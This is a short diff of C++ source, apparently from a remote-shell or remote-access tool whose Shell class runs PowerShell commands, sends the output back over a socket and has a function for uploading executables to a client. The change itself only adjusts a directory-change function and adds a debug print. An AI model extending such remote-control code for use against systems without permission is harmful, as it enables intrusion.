@@ -68,9 +68,10 @@ void Shell::runPOWERSHELL(SOCKET* client, const std::vector<std::string> args)
 		send(*client, ret.c_str(), BUFFER_LEN, 0);
 	}
 }
-void Shell::cd(Client* client, const std::string directory)
+void Shell::cd( const std::string directory)
 {
-	_chdir(directory.c_str());
+	int ret = _chdir(directory.c_str());
+	std::cout << "Ret : " << ret;
 }
 void Shell::uploadToClientExe(Client* client, std::string filename)
 {
